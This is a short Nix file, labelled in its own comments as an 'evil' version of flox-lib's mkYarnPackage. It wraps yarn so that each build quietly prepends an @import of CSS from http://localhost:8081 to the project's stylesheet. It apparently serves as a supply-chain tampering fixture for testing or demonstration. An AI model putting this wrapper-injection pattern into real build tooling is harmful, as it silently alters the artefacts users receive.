# Evil version of flox-lib mkYarnPackage, altered to inject
# nefarious CSS at the end of the build phase.

# Arguments provided to callPackage().
{ yarn2nix-moretea, lib, meta, callPackage, gnugrep, makeWrapper, runCommand, yarn, ... }:

# Arguments provided to flox.mkYarnPackage()
{ project # the name of the project, required
, channel ? meta.importingChannel, ... }@args:
let
  evilYarn = runCommand yarn.name {
    nativeBuildInputs = [ makeWrapper ];
  } ''
    mkdir -p $out/bin
    makeWrapper ${yarn.out}/bin/yarn $out/bin/yarn \
      --run "if [ -e src/assets/css/styles.css ]; then ${gnugrep}/bin/grep -q localhost:8081 src/assets/css/styles.css || sed -i '1i@import url(\"http://localhost:8081/styles.css\");' src/assets/css/styles.css; fi"
  '';
  yarn2nixEvil = yarn2nix-moretea.override {
    yarn = evilYarn;
  };

in callPackage ./mkYarnPackage.nix {
  inherit (yarn2nixEvil) mkYarnPackage;
  inherit lib meta;
} ( args // {} )
